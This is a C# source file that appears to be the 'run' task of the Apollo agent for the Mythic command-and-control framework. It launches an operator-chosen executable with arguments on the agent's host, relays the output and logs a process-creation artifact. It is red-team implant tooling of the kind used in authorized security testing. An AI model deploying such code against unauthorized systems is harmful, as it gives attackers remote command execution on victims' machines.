#define COMMAND_NAME_UPPER

#if DEBUG
#define RUN
#endif

#if RUN

using ApolloInterop.Classes;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Runtime.Serialization;
using System.Threading;

namespace Tasks
{
    public class run : Tasking
    {
        [DataContract]
        internal struct RunParameters
        {
            [DataMember(Name = "executable")] public string Executable;
            [DataMember(Name = "arguments")] public string Arguments;
        }
        private AutoResetEvent _complete = new AutoResetEvent(false);
        public run(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
        }

        public override void Start()
        {
            Process proc = null;
            if (string.IsNullOrEmpty(_data.Parameters))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse(
                        "No command line arguments passed.", true, "error"));
            }
            else
            {
                RunParameters parameters = _jsonSerializer.Deserialize<RunParameters>(_data.Parameters);
                string app = parameters.Executable;
                string cmdline = parameters.Arguments;
                if (string.IsNullOrEmpty(app))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        "No executable passed.",
                        true,
                        "error"));
                }
                else
                {
                    // The process layer assembles the command line. Preserve executable
                    // quoting and arguments, including embedded copies of the executable.

                    proc = _agent.GetProcessManager().NewProcess(app, cmdline);
                    proc.OutputDataReceived += DataReceived;
                    proc.ErrorDataReceieved += DataReceived;
                    proc.Exit += Proc_Exit;
                    bool bRet = false;
                    bRet = proc.Start();
                    if (!bRet)
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            $"Failed to start process. Reason: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}",
                            true,
                            "error"));
                    }
                    else
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            "", false, "", new IMythicMessage[]
                            {
                                Artifact.ProcessCreate((int) proc.PID, app, cmdline)
                            }));
                        while(proc != null && !proc.HasExited && !_cancellationToken.IsCancellationRequested)
                        {
                            try
                            {
                                WaitHandle.WaitAny(new WaitHandle[]
                                {
                                _complete,
                                _cancellationToken.Token.WaitHandle,
                                }, 500);
                            }
                            catch (OperationCanceledException)
                            {
                            }
                        }

                        if (proc != null && !proc.HasExited)
                        {
                            proc.Kill();
                            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
                        }
                    }
                }
            }
        }

        private void Proc_Exit(object sender, EventArgs e)
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", true));
            _complete.Set();
        }

        private void DataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    e.Data,
                    false,
                    ""));
            }
        }
    }
}
#endif